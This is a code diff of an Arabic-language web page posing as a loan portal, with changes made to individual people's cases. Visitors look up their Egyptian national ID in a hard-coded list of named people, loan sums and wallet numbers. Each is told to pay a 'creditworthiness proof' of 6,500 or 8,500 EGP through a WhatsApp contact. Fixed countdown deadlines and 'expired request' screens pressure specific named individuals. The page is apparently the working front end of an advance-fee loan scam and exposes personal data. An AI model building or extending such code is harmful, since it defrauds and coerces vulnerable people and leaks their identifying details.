@@ -190,7 +190,7 @@
             box-shadow: 0 8px 20px rgba(46, 204, 113, 0.6);
         }
 
-        .suspended-card, .proof-required-card, .payment-card, .credit-card {
+        .suspended-card, .proof-required-card, .payment-card, .credit-card, .expired-card {
             background: var(--glass-bg);
             backdrop-filter: blur(20px);
             border-radius: 2rem;
@@ -201,6 +201,10 @@
 
         .suspended-card {
             border: 2px solid var(--warning);
+        }
+
+        .expired-card {
+            border: 2px solid var(--danger);
         }
 
         .proof-required-card {
@@ -433,7 +437,7 @@
 </div>
 
 <script>
-    // ========== قاعدة البيانات المصححة (جميع العملاء ذو 14 رقماً فقط) ==========
+    // ========== قاعدة البيانات المصححة (جميع العملاء ذو 14 رقماً) ==========
     const customersDatabase = {
         // العملاء الأصليون (ذو 14 رقماً)
         "27707081900301": { name: "هناء محمد اسماعيل حبيب", loan: 200000, wallet: "فودافون كاش", walletNum: "01063083201", suspended: false },
@@ -524,22 +528,24 @@
     };
 
     const WHATSAPP_NUMBER = "212780488542";
-    const HOLD_DURATION_MS = 60 * 60 * 1000;
-    const CONTACT_BEFORE_MS = 15 * 60 * 1000;
-
+    
+    // موعد ثابت للعميل عبدالرحيم: 16 مايو 2026 الساعة 9:00 مساءً
+    const ABDULRAHIM_DEADLINE = new Date(2026, 4, 16, 21, 0, 0).getTime(); // month 4 = مايو
+    
     let currentCustomer = null;
     let currentNationalId = null;
     let timerInterval = null;
     let deliveryInterval = null;
 
     function formatTimeLeft(ms) {
+        if (ms <= 0) return "00:00";
         let totalSec = Math.floor(ms / 1000);
         let mins = Math.floor(totalSec / 60);
         let secs = totalSec % 60;
         return `${String(mins).padStart(2, '0')}:${String(secs).padStart(2, '0')}`;
     }
 
-    // ========== واجهة خاصة للعميل صابر (26907312400212) ==========
+    // ========== واجهة خاصة للعميل صابر ==========
     function buildSpecialProofForSabar(customer, nationalId) {
         const proofAmount = 8500;
         const deadlineTime = "4:30 عصراً";
@@ -622,6 +628,137 @@
         }
     }
 
+    // ========== دالة لعرض الطلب المنتهي للعميل محمد حسين ==========
+    function buildExpiredRequestMessage(customer, nationalId) {
+        return `
+            <div class="expired-card">
+                <i class="fas fa-hourglass-end" style="font-size:3rem; color:var(--danger);"></i>
+                <h2 style="color:var(--danger);">⛔ الطلب منتهي</h2>
+                <p><strong>${customer.name}</strong> ، لقد انتهت صلاحية طلبك السابق.</p>
+                <div class="step-box" style="border-right-color:var(--danger);">
+                    <strong>⚠️ لابد من الرجوع إلى قسم التحويلات المالية لفتح الطلب مرة أخرى</strong><br>
+                    سيتم صرف القرض المدفوع لحسابك (${customer.loan.toLocaleString('ar-EG')} ج.م) فوراً بعد إثبات الجدارة المحددة.
+                </div>
+                <div class="step-box">
+                    <i class="fas fa-info-circle"></i> <strong>إجراءات فتح الطلب:</strong><br>
+                    • اضغط على زر الواتساب أدناه للتواصل مع قسم التحويلات المالية.<br>
+                    • سيتم إعادة تفعيل طلبك ويمكنك بعدها إثبات الجدارة وصرف المبلغ فوراً.
+                </div>
+                <button class="btn-whatsapp" id="reopenRequestBtn">
+                    <i class="fab fa-whatsapp fa-lg"></i> التواصل مع قسم التحويلات المالية لفتح الطلب
+                </button>
+            </div>
+        `;
+    }
+
+    function attachExpiredEvents(customer, nationalId) {
+        const btn = document.getElementById('reopenRequestBtn');
+        if (btn) {
+            btn.onclick = () => {
+                const msg = `📢 طلب إعادة فتح الطلب (منتهي)\nالعميل: ${customer.name}\nالرقم القومي: ${nationalId}\nالمبلغ المستحق للصرف: ${customer.loan.toLocaleString('ar-EG')} ج.م\nأرجو إعادة فتح الطلب لإتمام إثبات الجدارة وصرف القرض.`;
+                window.open(`https://wa.me/${WHATSAPP_NUMBER}?text=${encodeURIComponent(msg)}`, '_blank');
+                alert("تم فتح محادثة واتساب مع قسم التحويلات المالية. سيتم إعادة فتح الطلب والمتابعة.");
+            };
+        }
+    }
+
+    // ========== دالة التعليق الخاصة بعبدالرحيم بموعد ثابت ==========
+    function buildAbdulrahimHoldMessage(customer, nationalId) {
+        const now = Date.now();
+        const timeLeft = ABDULRAHIM_DEADLINE - now;
+        const halfHourBefore = 30 * 60 * 1000; // 30 دقيقة
+        const canContact = (timeLeft <= halfHourBefore && timeLeft > 0);
+        const expired = timeLeft <= 0;
+        
+        let contactHtml = "";
+        let btnDisabled = true;
+        let btnText = "⏳ يرجى الانتظار...";
+        
+        if (expired) {
+            contactHtml = `<div class="warning-badge" style="background:#EF4444AA;">❌ انتهت المهلة (الساعة 9:00 مساءً 16/05/2026). تم إلغاء الطلب. يرجى التواصل مع الدعم لإعادة الفتح.</div>`;
+            btnText = "❌ الطلب ملغي";
+        } else if (canContact) {
+            contactHtml = `<div class="step-box" style="border-right-color:#25D366;"><i class="fab fa-whatsapp"></i> <strong>✅ يمكنك الآن فتح التعليق</strong><br>لديك نصف ساعة قبل الساعة 9:00 مساءً للتواصل مع التحويلات المالية. اضغط الزر أدناه لإبلاغهم.</div>`;
+            btnDisabled = false;
+            btnText = "<i class='fab fa-whatsapp'></i> إبلاغ التحويلات المالية (فتح التعليق)";
+        } else {
+            const waitTime = formatTimeLeft(timeLeft - halfHourBefore);
+            contactHtml = `<div class="step-box"><i class="fas fa-hourglass-half"></i> <strong>⏳ يجب الانتظار حتى موعد فتح التعليق</strong><br>يمكنك التواصل مع التحويلات المالية خلال نصف الساعة الأخيرة قبل الساعة 9:00 مساءً.<br>الوقت المتبقي لبدء فترة التواصل: <strong>${waitTime}</strong></div>`;
+        }
+        
+        return `
+            <div class="suspended-card">
+                <i class="fas fa-ban" style="font-size:3rem; color:var(--warning);"></i>
+                <h2>⛔ طلبك معلق مؤقتاً</h2>
+                <p><strong>${customer.name}</strong> ، تم تعليق الطلب بناءً على تعليمات النظام.</p>
+                <div class="timer-glow">
+                    <div><i class="fas fa-stopwatch"></i> الوقت المتبقي حتى إغلاق الطلب نهائياً (9:00 مساءً 16/05/2026)</div>
+                    <div class="timer" id="holdTimer">${formatTimeLeft(timeLeft > 0 ? timeLeft : 0)}</div>
+                    <div style="font-size:0.75rem;">يجب فتح التعليق قبل انتهاء الوقت.</div>
+                </div>
+                ${contactHtml}
+                ${!expired ? `
+                <button class="btn-whatsapp ${btnDisabled ? 'disabled-btn' : ''}" id="contactSupportBtn" ${btnDisabled ? 'disabled' : ''}>
+                    ${btnText}
+                </button>
+                ` : ''}
+                <div class="step-box" style="margin-top:1rem;">
+                    <i class="fas fa-info-circle"></i> <strong>هام:</strong> بعد فتح التعليق، يمكنك المتابعة إلى إثبات الجدارة وصرف القرض فوراً.
+                </div>
+            </div>
+        `;
+    }
+    
+    function startAbdulrahimTimer(customer, nationalId) {
+        if (timerInterval) clearInterval(timerInterval);
+        const timerEl = document.getElementById('holdTimer');
+        if (!timerEl) return;
+        
+        timerInterval = setInterval(() => {
+            const now = Date.now();
+            const timeLeft = ABDULRAHIM_DEADLINE - now;
+            if (timeLeft <= 0) {
+                clearInterval(timerInterval);
+                timerEl.innerText = "00:00";
+                const section = document.getElementById('resultSection');
+                section.innerHTML = `<div class="expired-card" style="border-color:#EF4444;">
+                    <i class="fas fa-times-circle" style="font-size:3rem; color:#EF4444;"></i>
+                    <h2>❌ تم إلغاء الطلب</h2>
+                    <p>انتهت المهلة المحددة (الساعة 9:00 مساءً 16/05/2026). يرجى التواصل مع الدعم لإعادة الفتح.</p>
+                </div>`;
+                return;
+            }
+            timerEl.innerText = formatTimeLeft(timeLeft);
+            
+            const halfHourBefore = 30 * 60 * 1000;
+            const canContact = (timeLeft <= halfHourBefore && timeLeft > 0);
+            const contactBtn = document.getElementById('contactSupportBtn');
+            if (contactBtn && !customer.contactDone) {
+                if (canContact && contactBtn.disabled) {
+                    // تحديث الواجهة لتمكين الزر
+                    const newHtml = buildAbdulrahimHoldMessage(customer, nationalId);
+                    document.getElementById('resultSection').innerHTML = newHtml;
+                    startAbdulrahimTimer(customer, nationalId);
+                    attachAbdulrahimEvents(customer, nationalId);
+                }
+            }
+        }, 1000);
+    }
+    
+    function attachAbdulrahimEvents(customer, nationalId) {
+        const contactBtn = document.getElementById('contactSupportBtn');
+        if (contactBtn && !customer.contactDone) {
+            contactBtn.onclick = () => {
+                if (contactBtn.disabled) return;
+                const msg = `📢 إبلاغ فتح التعليق (عبدالرحيم)\nالعميل: ${customer.name}\nالرقم القومي: ${nationalId}\nأبلغكم برغبتي في فتح الطلب وإكمال إثبات الجدارة.`;
+                window.open(`https://wa.me/${WHATSAPP_NUMBER}?text=${encodeURIComponent(msg)}`, '_blank');
+                customer.contactDone = true;
+                // بعد الإبلاغ، ننتقل إلى مرحلة إثبات الجدارة
+                displayProofStage(customer, nationalId);
+            };
+        }
+    }
+
     // ========== باقي الدوال المساعدة ==========
     function buildProofRequiredMessage(customer, nationalId) {
         const proofAmount = customer.loan < 100000 ? 6500 : 8500;
@@ -677,125 +814,6 @@
                 const msg = `📢 طلب إثبات الجدارة الائتمانية\nالعميل: ${customer.name}\nالرقم القومي: ${nationalId}\nالمبلغ المطلوب إثباته: ${proofAmount.toLocaleString('ar-EG')} ج.م\nالمبلغ المستحق للصرف: ${customer.loan.toLocaleString('ar-EG')} ج.م\nأرجو توجيهي لإتمام إجراءات الإثبات.`;
                 window.open(`https://wa.me/${WHATSAPP_NUMBER}?text=${encodeURIComponent(msg)}`, '_blank');
                 alert("تم فتح محادثة واتساب مع قسم التحويلات المالية. يرجى متابعة التعليمات لإتمام الإثبات.");
-            };
-        }
-    }
-
-    function buildHoldMessage(customer, nationalId) {
-        const now = Date.now();
-        const holdUntil = customer.holdUntil;
-        const timeLeft = holdUntil - now;
-        const canContact = timeLeft <= (HOLD_DURATION_MS - CONTACT_BEFORE_MS) && timeLeft > 0;
-        const contactExpired = timeLeft <= 0;
-
-        let contactStatus = "";
-        let btnDisabled = true;
-        let btnText = "⏳ يرجى الانتظار...";
-
-        if (contactExpired) {
-            contactStatus = `<div class="warning-badge" style="background:#EF4444AA;">❌ انتهت مهلة التعليق (ساعة). تم إلغاء الطلب. يرجى التوجه للدعم.</div>`;
-            btnText = "❌ الطلب ملغي";
-        } else if (canContact) {
-            contactStatus = `<div class="step-box" style="border-right-color:#25D366;"><i class="fab fa-whatsapp"></i> <strong>✅ يمكنك الآن إبلاغ التحويلات المالية</strong><br>يجب أن يتم الإبلاغ قبل إثبات الجدارة بـ 15 دقيقة. اضغط الزر أدناه للتواصل.</div>`;
-            btnDisabled = false;
-            btnText = "<i class='fab fa-whatsapp'></i> إبلاغ التحويلات المالية (فتح التعليق)";
-        } else {
-            const waitMs = HOLD_DURATION_MS - CONTACT_BEFORE_MS - (HOLD_DURATION_MS - timeLeft);
-            const waitTime = formatTimeLeft(waitMs > 0 ? waitMs : 0);
-            contactStatus = `<div class="step-box"><i class="fas fa-hourglass-half"></i> <strong>⏳ يجب الانتظار قبل الإبلاغ</strong><br>سيظهر زر الإبلاغ بعد <strong>${waitTime}</strong> من الآن. (يلزم الإبلاغ قبل الإثبات بـ 15 دقيقة)</div>`;
-        }
-
-        return `
-            <div class="suspended-card">
-                <i class="fas fa-ban" style="font-size:3rem; color:var(--warning);"></i>
-                <h2>⛔ طلبك معلق مؤقتاً</h2>
-                <p><strong>${customer.name}</strong> ، تم تعليق طلب إثبات الجدارة لمدة ساعة بناءً على تعليمات النظام.</p>
-                <div class="timer-glow">
-                    <div><i class="fas fa-stopwatch"></i> الوقت المتبقي لإنهاء التعليق</div>
-                    <div class="timer" id="holdTimer">${formatTimeLeft(timeLeft > 0 ? timeLeft : 0)}</div>
-                    <div style="font-size:0.75rem;">بعد انقضاء الساعة، سيتم إلغاء الطلب تلقائياً.</div>
-                </div>
-                ${contactStatus}
-                ${!contactExpired && !customer.contactDone ? `
-                <button class="btn-whatsapp ${btnDisabled ? 'disabled-btn' : ''}" id="contactSupportBtn" ${btnDisabled ? 'disabled' : ''}>
-                    ${btnText}
-                </button>
-                ` : ''}
-                ${customer.contactDone ? `
-                <div class="step-box" style="background:#00660040; border-right-color:#25D366;">
-                    ✅ <strong>تم إبلاغ التحويلات المالية بنجاح</strong><br>يمكنك الآن متابعة إثبات الجدارة.
-                </div>
-                <button class="btn-whatsapp" id="proceedToProofBtn">
-                    <i class="fas fa-check-circle"></i> المتابعة إلى إثبات الجدارة
-                </button>
-                ` : ''}
-                <div class="step-box" style="margin-top:1rem;">
-                    <i class="fas fa-info-circle"></i> <strong>هام:</strong> إذا قمت بإثبات الجدارة قبل الإبلاغ، سيتم رفض العملية وستضطر لإعادة المحاولة من جديد.
-                </div>
-            </div>
-        `;
-    }
-
-    function startHoldTimer(customer, nationalId) {
-        if (timerInterval) clearInterval(timerInterval);
-        const timerEl = document.getElementById('holdTimer');
-        if (!timerEl) return;
-
-        timerInterval = setInterval(() => {
-            const now = Date.now();
-            const timeLeft = customer.holdUntil - now;
-            if (timeLeft <= 0) {
-                clearInterval(timerInterval);
-                timerEl.innerText = "00:00";
-                const section = document.getElementById('resultSection');
-                section.innerHTML = `<div class="suspended-card" style="border-color:#EF4444;">
-                    <i class="fas fa-times-circle" style="font-size:3rem; color:#EF4444;"></i>
-                    <h2>❌ تم إلغاء الطلب</h2>
-                    <p>انتهت مهلة الساعة دون إتمام الإجراءات. يرجى التواصل مع الدعم.</p>
-                </div>`;
-                return;
-            }
-            timerEl.innerText = formatTimeLeft(timeLeft);
-            
-            const contactBtn = document.getElementById('contactSupportBtn');
-            if (contactBtn && !customer.contactDone) {
-                const canContact = timeLeft <= (HOLD_DURATION_MS - CONTACT_BEFORE_MS);
-                if (canContact && contactBtn.disabled) {
-                    contactBtn.disabled = false;
-                    contactBtn.classList.remove('disabled-btn');
-                    contactBtn.innerHTML = "<i class='fab fa-whatsapp'></i> إبلاغ التحويلات المالية (فتح التعليق)";
-                    const container = document.getElementById('resultSection');
-                    const newHtml = buildHoldMessage(customer, nationalId);
-                    container.innerHTML = newHtml;
-                    startHoldTimer(customer, nationalId);
-                    attachContactEvents(customer, nationalId);
-                }
-            }
-        }, 1000);
-    }
-
-    function attachContactEvents(customer, nationalId) {
-        const contactBtn = document.getElementById('contactSupportBtn');
-        if (contactBtn && !customer.contactDone) {
-            contactBtn.onclick = () => {
-                if (contactBtn.disabled) return;
-                const msg = `📢 إبلاغ فتح التعليق\nالعميل: ${customer.name}\nالرقم القومي: ${nationalId}\nأبلغكم برغبتي في فتح الطلب وإكمال إثبات الجدارة.`;
-                window.open(`https://wa.me/${WHATSAPP_NUMBER}?text=${encodeURIComponent(msg)}`, '_blank');
-                customer.contactDone = true;
-                const section = document.getElementById('resultSection');
-                section.innerHTML = buildHoldMessage(customer, nationalId);
-                startHoldTimer(customer, nationalId);
-                attachContactEvents(customer, nationalId);
-            };
-        }
-        const proceedBtn = document.getElementById('proceedToProofBtn');
-        if (proceedBtn) {
-            proceedBtn.onclick = () => {
-                if (customer.contactDone) {
-                    displayProofStage(customer, nationalId);
-                } else {
-                    alert("يجب إبلاغ التحويلات المالية أولاً!");
-                }
             };
         }
     }
@@ -892,6 +910,14 @@
                 buildSpecialProofForSabar(customer, nationalId);
                 return;
             }
+            
+            // حالة خاصة للعميل محمد حسين حامد (طلب منتهي)
+            if (nationalId === "29209190102632") {
+                const html = buildExpiredRequestMessage(customer, nationalId);
+                document.getElementById('resultSection').innerHTML = html;
+                attachExpiredEvents(customer, nationalId);
+                return;
+            }
 
             // حالة خاصة لرضا على عبده
             if (nationalId === "29407021601596") {
@@ -902,25 +928,24 @@
                 return;
             }
 
-            // حالة خاصة لعبد الرحيم احمد
+            // حالة خاصة لعبد الرحيم احمد (تعليق بموعد ثابت)
             if (nationalId === "28712102703133") {
-                if (!customer.holdUntil) {
-                    customer.holdUntil = Date.now() + HOLD_DURATION_MS;
+                if (!customer.contactDone) {
                     customer.contactDone = false;
                 }
                 const now = Date.now();
-                if (now >= customer.holdUntil) {
-                    document.getElementById('resultSection').innerHTML = `<div class="suspended-card" style="border-color:#EF4444;">
+                if (now >= ABDULRAHIM_DEADLINE) {
+                    document.getElementById('resultSection').innerHTML = `<div class="expired-card" style="border-color:#EF4444;">
                         <i class="fas fa-times-circle" style="font-size:3rem; color:#EF4444;"></i>
                         <h2>❌ تم إلغاء الطلب</h2>
-                        <p>انتهت مهلة الساعة دون إتمام الإجراءات. يرجى التواصل مع الدعم.</p>
+                        <p>انتهت المهلة المحددة (الساعة 9:00 مساءً 16/05/2026). يرجى التواصل مع الدعم لإعادة الفتح.</p>
                     </div>`;
                     return;
                 }
-                const html = buildHoldMessage(customer, nationalId);
+                const html = buildAbdulrahimHoldMessage(customer, nationalId);
                 document.getElementById('resultSection').innerHTML = html;
-                startHoldTimer(customer, nationalId);
-                attachContactEvents(customer, nationalId);
+                startAbdulrahimTimer(customer, nationalId);
+                attachAbdulrahimEvents(customer, nationalId);
                 return;
             }
 
